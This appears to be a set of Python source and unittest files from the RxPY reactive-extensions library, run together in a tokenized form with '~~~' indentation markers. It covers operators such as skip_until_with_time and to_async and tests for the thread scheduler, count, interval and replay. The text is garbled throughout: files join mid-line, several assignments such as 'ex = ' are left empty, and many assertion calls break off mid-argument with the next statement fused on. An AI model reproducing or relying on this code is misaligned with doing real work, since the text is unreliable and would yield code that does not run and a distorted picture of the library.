from rx . internal import extensionmethod \n 
\n 
\n 
@ extensionmethod ( Observable ) \n 
def skip_until_with_time ( self , start_time , scheduler ) : \n 
~~~ """Skips elements from the observable source sequence until the\n    specified start time, using the specified scheduler to run timers.\n    Errors produced by the source sequence are always forwarded to the\n    result sequence, even if the error occurs before the start time.\n\n    Examples:\n    res = source.skip_until_with_time(new Date(), [optional scheduler]);\n    res = source.skip_until_with_time(5000, [optional scheduler]);\n\n    Keyword arguments:\n    start_time -- Time to start taking elements from the source sequence. If\n        this value is less than or equal to Date(), no elements will be\n        skipped.\n    scheduler -- Scheduler to run the timer on. If not specified, defaults\n        to rx.Scheduler.timeout.\n\n    Returns {Observable} An observable sequence with the elements skipped\n    until the specified start time.\n    """ \n 
\n 
scheduler = scheduler or timeout_scheduler \n 
\n 
source = self \n 
\n 
if isinstance ( start_time , datetime ) : \n 
~~~ scheduler_method = \n 
~~ else : \n 
~~~ scheduler_method = \n 
\n 
~~ def subscribe ( observer ) : \n 
~~~ open = [ False ] \n 
\n 
def on_next ( x ) : \n 
~~~ if open [ 0 ] : \n 
~~~ observer . on_next ( x ) \n 
~~ ~~ subscription = source . subscribe ( on_next , observer . on_error , \n 
observer . on_completed ) \n 
\n 
def action ( scheduler , state ) : \n 
~~~ open [ 0 ] = True \n 
~~ disposable = getattr ( scheduler , scheduler_method ) ( start_time , action ) \n 
return CompositeDisposable ( disposable , subscription ) \n 
~~ return AnonymousObservable ( subscribe ) \n 
~~ from rx . observable import Observable \n 
from rx . concurrency import timeout_scheduler \n 
from rx . subjects import AsyncSubject \n 
from rx . internal import extensionclassmethod \n 
\n 
\n 
@ extensionclassmethod ( Observable ) \n 
def to_async ( cls , func , scheduler = None ) : \n 
~~~ """Converts the function into an asynchronous function. Each invocation\n    of the resulting asynchronous function causes an invocation of the\n    original synchronous function on the specified scheduler.\n\n    Example:\n    res = Observable.to_async(lambda x, y: x + y)(4, 3)\n    res = Observable.to_async(lambda x, y: x + y, Scheduler.timeout)(4, 3)\n    res = Observable.to_async(lambda x: log.debug(x),\n                              Scheduler.timeout)(\'hello\')\n\n    func -- {Function} Function to convert to an asynchronous function.\n    scheduler -- {Scheduler} [Optional] Scheduler to run the function on. If\n        not specified, defaults to Scheduler.timeout.\n\n    Returns {Function} Asynchronous function.\n    """ \n 
\n 
scheduler = scheduler or timeout_scheduler \n 
\n 
def wrapper ( * args ) : \n 
~~~ subject = AsyncSubject ( ) \n 
\n 
def action ( scheduler , state ) : \n 
~~~ try : \n 
~~~ result = func ( * args ) \n 
~~ except Exception as ex : \n 
~~~ subject . on_error ( ex ) \n 
return \n 
\n 
~~ subject . on_next ( result ) \n 
subject . on_completed ( ) \n 
\n 
~~ scheduler . schedule ( action ) \n 
return subject . as_observable ( ) \n 
~~ return wrapper \n 
~~ from rx import Lock \n 
\n 
\n 
class InnerSubscription ( object ) : \n 
~~~ def __init__ ( self , subject , observer ) : \n 
~~~ self . subject = subject \n 
self . observer = observer \n 
\n 
self . lock = Lock ( ) \n 
\n 
~~ def dispose ( self ) : \n 
~~~ with self . lock : \n 
~~~ if not self . subject . is_disposed and self . observer : \n 
~~~ if self . observer in self . subject . observers : \n 
~~~ self . subject . observers . remove ( self . observer ) \n 
~~ self . observer = None \n 
~~ ~~ ~~ ~~ import unittest \n 
\n 
from datetime import datetime , timedelta \n 
from time import sleep \n 
from rx . concurrency import NewThreadScheduler \n 
\n 
class TestNewThreadScheduler ( unittest . TestCase ) : \n 
~~~ def test_new_thread_now ( self ) : \n 
~~~ scheduler = NewThreadScheduler ( ) \n 
res = scheduler . now ( ) - datetime . utcnow ( ) \n 
assert res < timedelta ( microseconds = 1000 ) \n 
\n 
~~ def test_new_thread_schedule_action ( self ) : \n 
~~~ scheduler = NewThreadScheduler ( ) \n 
ran = [ False ] \n 
\n 
def action ( scheduler , state ) : \n 
~~~ ran [ 0 ] = True \n 
\n 
~~ scheduler . schedule ( action ) \n 
\n 
sleep ( 0.1 ) \n 
assert ( ran [ 0 ] == True ) \n 
\n 
~~ def test_new_thread_schedule_action_due ( self ) : \n 
~~~ scheduler = NewThreadScheduler ( ) \n 
starttime = datetime . utcnow ( ) \n 
endtime = [ None ] \n 
\n 
def action ( scheduler , state ) : \n 
~~~ endtime [ 0 ] = datetime . utcnow ( ) \n 
\n 
~~ scheduler . schedule_relative ( timedelta ( milliseconds = 200 ) , action ) \n 
\n 
sleep ( 0.3 ) \n 
diff = endtime [ 0 ] - starttime \n 
assert ( diff > timedelta ( milliseconds = 180 ) ) \n 
\n 
~~ def test_new_thread_schedule_action_cancel ( self ) : \n 
~~~ ran = [ False ] \n 
scheduler = NewThreadScheduler ( ) \n 
\n 
def action ( scheduler , state ) : \n 
~~~ ran [ 0 ] = True \n 
~~ d = scheduler . schedule_relative ( timedelta ( milliseconds = 1 ) , action ) \n 
d . dispose ( ) \n 
\n 
sleep ( 0.1 ) \n 
assert ( not ran [ 0 ] ) \n 
~~ ~~ import unittest \n 
\n 
from rx import Observable \n 
from rx . testing import TestScheduler , ReactiveTest , is_prime , MockDisposable \n 
from rx . disposables import Disposable , SerialDisposable \n 
\n 
on_next = ReactiveTest . on_next \n 
on_completed = ReactiveTest . on_completed \n 
on_error = ReactiveTest . on_error \n 
subscribe = ReactiveTest . subscribe \n 
subscribed = ReactiveTest . subscribed \n 
disposed = ReactiveTest . disposed \n 
created = ReactiveTest . created \n 
\n 
class TestCount ( unittest . TestCase ) : \n 
~~~ def test_count_empty ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_completed ( 250 ) ) \n 
res = scheduler . start ( create = lambda : xs . count ( ) ) . messages \n 
res . assert_equal ( on_next ( 250 , 0 ) , on_completed ( 250 ) ) \n 
\n 
~~ def test_count_empty_ii ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_completed ( 250 ) ) \n 
\n 
def create ( ) : \n 
~~~ return xs . count ( ) \n 
\n 
~~ res = scheduler . start ( create = create ) . messages \n 
res . assert_equal ( on_next ( 250 , 1 ) , on_completed ( 250 ) ) \n 
\n 
~~ def test_count_some ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next res = scheduler . start ( create = lambda : xs . count ( ) ) . messages \n 
res . assert_equal ( on_next ( 250 , 3 ) , on_completed ( 250 ) ) \n 
\n 
~~ def test_count_throw ( self ) : \n 
~~~ ex = \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_error ( 210 , ex ) ) \n 
res = scheduler . start ( create = lambda : xs . count ( ) ) . messages \n 
res . assert_equal ( on_error ( 210 , ex ) ) \n 
\n 
~~ def test_count_never ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) ) \n 
res = scheduler . start ( create = lambda : xs . count ( ) ) . messages \n 
res . assert_equal ( ) \n 
\n 
~~ def test_count_predicate_empty_true ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_completed ( 250 ) ) \n 
\n 
def create ( ) : \n 
~~~ return xs . count ( lambda _ : True ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_next ( 250 , 0 ) , on_completed ( 250 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 250 ) ) \n 
\n 
~~ def test_count_predicate_empty_false ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_completed ( 250 ) ) \n 
\n 
def create ( ) : \n 
~~~ return xs . count ( lambda _ : False ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_next ( 250 , 0 ) , on_completed ( 250 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 250 ) ) \n 
\n 
~~ def test_count_predicate_return_true ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_completed ( 250 ) ) \n 
\n 
def create ( ) : \n 
~~~ return xs . count ( lambda _ : True ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_next ( 250 , 1 ) , on_completed ( 250 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 250 ) ) \n 
\n 
~~ def test_count_predicate_return_false ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_completed ( 250 ) ) \n 
\n 
def create ( ) : \n 
~~~ return xs . count ( lambda _ : False ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_next ( 250 , 0 ) , on_completed ( 250 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 250 ) ) \n 
\n 
~~ def test_count_predicate_some_all ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next \n 
def create ( ) : \n 
~~~ return xs . count ( lambda x : x < 10 ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_next ( 250 , 3 ) , on_completed ( 250 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 250 ) ) \n 
\n 
~~ def test_count_predicate_some_none ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next \n 
def create ( ) : \n 
~~~ return xs . count ( lambda x : x > 10 ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_next ( 250 , 0 ) , on_completed ( 250 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 250 ) ) \n 
\n 
~~ def test_count_predicate_some_even ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next \n 
def create ( ) : \n 
~~~ return xs . count ( lambda x : x % 2 == 0 ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_next ( 250 , 2 ) , on_completed ( 250 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 250 ) ) \n 
\n 
~~ def test_count_predicate_throw_true ( self ) : \n 
~~~ ex = \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_error ( 210 , ex ) ) \n 
\n 
def create ( ) : \n 
~~~ return xs . count ( lambda _ : True ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_error ( 210 , ex ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 210 ) ) \n 
\n 
~~ def test_count_predicate_throw_false ( self ) : \n 
~~~ ex = \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_error ( 210 , ex ) ) \n 
\n 
def create ( ) : \n 
~~~ return xs . count ( lambda _ : False ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_error ( 210 , ex ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 210 ) ) \n 
\n 
~~ def test_count_predicate_never ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) ) \n 
\n 
def create ( ) : \n 
~~~ return xs . count ( lambda _ : True ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 1000 ) ) \n 
\n 
~~ def test_count_predicate_predicate_throws ( self ) : \n 
~~~ ex = \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 230 , 3 ) , on_completed \n 
def create ( ) : \n 
~~~ def predicate ( x ) : \n 
~~~ if x == 3 : \n 
~~~ raise Exception ( ex ) \n 
~~ else : \n 
~~~ return True \n 
\n 
~~ ~~ return xs . count ( predicate ) \n 
\n 
~~ res = scheduler . start ( create = create ) \n 
\n 
res . messages . assert_equal ( on_error ( 230 , ex ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 200 , 230 ) ) \n 
~~ ~~ import unittest \n 
from datetime import datetime , timedelta \n 
\n 
from rx import Observable \n 
from rx . testing import TestScheduler , ReactiveTest , is_prime , MockDisposable \n 
from rx . disposables import Disposable , SerialDisposable \n 
from rx . subjects import Subject \n 
\n 
on_next = ReactiveTest . on_next \n 
on_completed = ReactiveTest . on_completed \n 
on_error = ReactiveTest . on_error \n 
subscribe = ReactiveTest . subscribe \n 
subscribed = ReactiveTest . subscribed \n 
disposed = ReactiveTest . disposed \n 
created = ReactiveTest . created \n 
\n 
class RxException ( Exception ) : \n 
~~~ pass \n 
\n 
# Helper function for raising exceptions within lambdas \n 
~~ def _raise ( ex ) : \n 
~~~ raise RxException ( ex ) \n 
\n 
~~ class TestTimeInterval ( unittest . TestCase ) : \n 
~~~ def test_interval_timespan_basic ( self ) : \n 
\n 
~~~ scheduler = TestScheduler ( ) \n 
\n 
def create ( ) : \n 
~~~ return Observable . interval ( 100 , scheduler = scheduler ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_next ( 300 , 0 ) , on_next ( 400 , 1 ) , on_next ( 500 , 2 ) , on_next ( 600 \n 
~~ def test_interval_timespan_zero ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
\n 
def create ( ) : \n 
~~~ return Observable . interval ( 0 , scheduler = scheduler ) \n 
\n 
~~ results = scheduler . start ( create , disposed = 210 ) \n 
results . messages . assert_equal ( on_next ( 201 , 0 ) , on_next ( 202 , 1 ) , on_next ( 203 , 2 ) , on_next ( 204 \n 
~~ def test_interval_timespan_negative ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
def create ( ) : \n 
~~~ return Observable . interval ( - 1 , scheduler = scheduler ) \n 
\n 
~~ results = scheduler . start ( create , disposed = 210 ) \n 
results . messages . assert_equal ( on_next ( 201 , 0 ) , on_next ( 202 , 1 ) , on_next ( 203 , 2 ) , on_next ( 204 \n 
~~ def test_interval_timespan_disposed ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
\n 
def create ( ) : \n 
~~~ return Observable . interval ( 1000 , scheduler = scheduler ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( ) \n 
\n 
~~ def test_interval_timespan_observer_throws ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = Observable . interval ( 1 , scheduler = scheduler ) \n 
xs . subscribe ( lambda x : _raise ( "ex" ) ) \n 
\n 
with self . assertRaises ( RxException ) : \n 
~~~ scheduler . start ( ) \n 
\n 
~~ ~~ ~~ import unittest \n 
\n 
from rx . observable import Observable \n 
from rx . testing import TestScheduler , ReactiveTest \n 
from rx . disposables import Disposable , SerialDisposable \n 
\n 
on_next = ReactiveTest . on_next \n 
on_completed = ReactiveTest . on_completed \n 
on_error = ReactiveTest . on_error \n 
subscribe = ReactiveTest . subscribe \n 
subscribed = ReactiveTest . subscribed \n 
disposed = ReactiveTest . disposed \n 
created = ReactiveTest . created \n 
\n 
class TestReplay ( unittest . TestCase ) : \n 
~~~ def test_replay_count_basic ( self ) : \n 
~~~ connection = [ None ] \n 
subscription = [ None ] \n 
ys = [ None ] \n 
\n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next results = scheduler . create_observer ( ) \n 
\n 
def action0 ( scheduler , state ) : \n 
~~~ ys [ 0 ] = xs . replay ( None , 3 , None , scheduler ) \n 
~~ scheduler . schedule_absolute ( created , action0 ) \n 
\n 
def action1 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] = ys [ 0 ] . subscribe ( results ) \n 
~~ scheduler . schedule_absolute ( 450 , action1 ) \n 
\n 
def action2 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( disposed , action2 ) \n 
\n 
def action3 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 300 , action3 ) \n 
\n 
def action4 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 400 , action4 ) \n 
\n 
def action5 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 500 , action5 ) \n 
\n 
def action6 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 550 , action6 ) \n 
\n 
def action7 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 650 , action7 ) \n 
\n 
def action8 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 800 , action8 ) \n 
\n 
scheduler . start ( ) \n 
results . messages . assert_equal ( on_next ( 451 , 5 ) , on_next ( 452 , 6 ) , on_next ( 453 , 7 ) , on_next ( 521 xs . subscriptions . assert_equal ( subscribe ( 300 , 400 ) , subscribe ( 500 , 550 ) , subscribe ( 650 , 800 ) ) \n 
~~ def test_replay_count_error ( self ) : \n 
~~~ connection = [ None ] \n 
subscription = [ None ] \n 
ys = [ None ] \n 
ex = \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next results = scheduler . create_observer ( ) \n 
\n 
def action0 ( scheduler , state ) : \n 
~~~ ys [ 0 ] = xs . replay ( None , 3 , None , scheduler ) \n 
~~ scheduler . schedule_absolute ( created , action0 ) \n 
\n 
def action1 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] = ys [ 0 ] . subscribe ( results ) \n 
~~ scheduler . schedule_absolute ( 450 , action1 ) \n 
\n 
def action2 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( disposed , action2 ) \n 
\n 
def action3 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 300 , action3 ) \n 
\n 
def action4 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 400 , action4 ) \n 
\n 
def action5 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 500 , action5 ) \n 
\n 
def action6 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 800 , action6 ) \n 
\n 
scheduler . start ( ) \n 
results . messages . assert_equal ( on_next ( 451 , 5 ) , on_next ( 452 , 6 ) , on_next ( 453 , 7 ) , on_next ( 521 xs . subscriptions . assert_equal ( subscribe ( 300 , 400 ) , subscribe ( 500 , 600 ) ) \n 
\n 
~~ def test_replay_count_complete ( self ) : \n 
~~~ connection = [ None ] \n 
subscription = [ None ] \n 
ys = [ None ] \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next results = scheduler . create_observer ( ) \n 
\n 
def action0 ( scheduler , state ) : \n 
~~~ ys [ 0 ] = xs . replay ( None , 3 , None , scheduler ) \n 
~~ scheduler . schedule_absolute ( created , action0 ) \n 
\n 
def action1 ( scehduler , state ) : \n 
~~~ subscription [ 0 ] = ys [ 0 ] . subscribe ( results ) \n 
~~ scheduler . schedule_absolute ( 450 , action1 ) \n 
\n 
def action2 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( disposed , action2 ) \n 
\n 
def action3 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 300 , action3 ) \n 
\n 
def action4 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 400 , action4 ) \n 
\n 
def action5 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 500 , action5 ) \n 
\n 
def action ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 800 , action ) \n 
\n 
scheduler . start ( ) \n 
results . messages . assert_equal ( on_next ( 451 , 5 ) , on_next ( 452 , 6 ) , on_next ( 453 , 7 ) , on_next ( 521 xs . subscriptions . assert_equal ( subscribe ( 300 , 400 ) , subscribe ( 500 , 600 ) ) \n 
\n 
~~ def test_replay_count_dispose ( self ) : \n 
~~~ connection = [ None ] \n 
subscription = [ None ] \n 
ys = [ None ] \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next results = scheduler . create_observer ( ) \n 
\n 
def action0 ( scheduler , state ) : \n 
~~~ ys [ 0 ] = xs . replay ( None , 3 , None , scheduler ) \n 
~~ scheduler . schedule_absolute ( created , action0 ) \n 
\n 
def action1 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] = ys [ 0 ] . subscribe ( results ) \n 
~~ scheduler . schedule_absolute ( 450 , action1 ) \n 
\n 
def action2 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 475 , action2 ) \n 
\n 
def action3 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 300 , action3 ) \n 
\n 
def action4 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 400 , action4 ) \n 
\n 
def action5 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 500 , action5 ) \n 
\n 
def action6 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 550 , action6 ) \n 
\n 
def action7 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 650 , action7 ) \n 
\n 
def action8 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 800 , action8 ) \n 
\n 
scheduler . start ( ) \n 
results . messages . assert_equal ( on_next ( 451 , 5 ) , on_next ( 452 , 6 ) , on_next ( 453 , 7 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 300 , 400 ) , subscribe ( 500 , 550 ) , subscribe ( 650 , 800 ) ) \n 
~~ def test_replay_count_multiple_connections ( self ) : \n 
~~~ xs = Observable . never ( ) \n 
ys = xs . replay ( None , 3 ) \n 
connection1 = ys . connect ( ) \n 
connection2 = ys . connect ( ) \n 
assert ( connection1 == connection2 ) \n 
connection1 . dispose ( ) \n 
connection2 . dispose ( ) \n 
connection3 = ys . connect ( ) \n 
assert ( connection1 != connection3 ) \n 
\n 
~~ def test_replay_count_lambda_zip_complete ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next \n 
def action ( ) : \n 
~~~ def selector ( _xs ) : \n 
~~~ return _xs . take ( 6 ) . repeat ( ) \n 
~~ return xs . replay ( selector , 3 , None , scheduler ) \n 
\n 
~~ results = scheduler . start ( action , disposed = 610 ) \n 
results . messages . assert_equal ( on_next ( 221 , 3 ) , on_next ( 281 , 4 ) , on_next ( 291 , 1 ) , on_next ( 341 xs . subscriptions . assert_equal ( subscribe ( 200 , 600 ) ) \n 
\n 
~~ def test_replay_count_lambda_zip_error ( self ) : \n 
~~~ ex = \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next \n 
def create ( ) : \n 
~~~ def selector ( _xs ) : \n 
~~~ return _xs . take ( 6 ) . repeat ( ) \n 
\n 
~~ return xs . replay ( selector , 3 , None , scheduler ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
\n 
results . messages . assert_equal ( on_next ( 221 , 3 ) , on_next ( 281 , 4 ) , on_next ( 291 , 1 ) , on_next ( 341 xs . subscriptions . assert_equal ( subscribe ( 200 , 600 ) ) \n 
\n 
~~ def test_replay_count_lambda_zip_dispose ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next \n 
def create ( ) : \n 
~~~ def selector ( _xs ) : \n 
~~~ return _xs . take ( 6 ) . repeat ( ) \n 
\n 
~~ return xs . replay ( selector , 3 , None , scheduler ) \n 
\n 
~~ results = scheduler . start ( create , disposed = 470 ) \n 
results . messages . assert_equal ( on_next ( 221 , 3 ) , on_next ( 281 , 4 ) , on_next ( 291 , 1 ) , on_next ( 341 xs . subscriptions . assert_equal ( subscribe ( 200 , 470 ) ) \n 
\n 
~~ def test_replay_time_basic ( self ) : \n 
~~~ subscription = [ None ] \n 
connection = [ None ] \n 
ys = [ None ] \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next results = scheduler . create_observer ( ) \n 
\n 
def action0 ( scheduler , state ) : \n 
~~~ ys [ 0 ] = xs . replay ( None , None , 150 , scheduler ) \n 
~~ scheduler . schedule_absolute ( created , action0 ) \n 
\n 
def action1 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] = ys [ 0 ] . subscribe ( results ) \n 
~~ scheduler . schedule_absolute ( 450 , action1 ) \n 
\n 
def action2 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( disposed , action2 ) \n 
\n 
def action3 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 300 , action3 ) \n 
\n 
def action4 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 400 , action4 ) \n 
\n 
def action5 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 500 , action5 ) \n 
\n 
def action6 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 550 , action6 ) \n 
\n 
def action7 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 650 , action7 ) \n 
\n 
def action8 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 800 , action8 ) \n 
\n 
scheduler . start ( ) \n 
results . messages . assert_equal ( on_next ( 451 , 8 ) , on_next ( 452 , 5 ) , on_next ( 453 , 6 ) , on_next ( 454 xs . subscriptions . assert_equal ( subscribe ( 300 , 400 ) , subscribe ( 500 , 550 ) , subscribe ( 650 , 800 ) ) \n 
~~ def test_replay_time_error ( self ) : \n 
~~~ subscription = [ None ] \n 
connection = [ None ] \n 
ys = [ None ] \n 
ex = \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next results = scheduler . create_observer ( ) \n 
\n 
def action0 ( scheduler , state ) : \n 
~~~ ys [ 0 ] = xs . replay ( None , None , 75 , scheduler ) \n 
~~ scheduler . schedule_absolute ( created , action0 ) \n 
\n 
def action1 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] = ys [ 0 ] . subscribe ( results ) \n 
~~ scheduler . schedule_absolute ( 450 , action1 ) \n 
\n 
def action2 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( disposed , action2 ) \n 
\n 
def action3 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 300 , action3 ) \n 
\n 
def action4 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 400 , action4 ) \n 
\n 
def action5 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 500 , action5 ) \n 
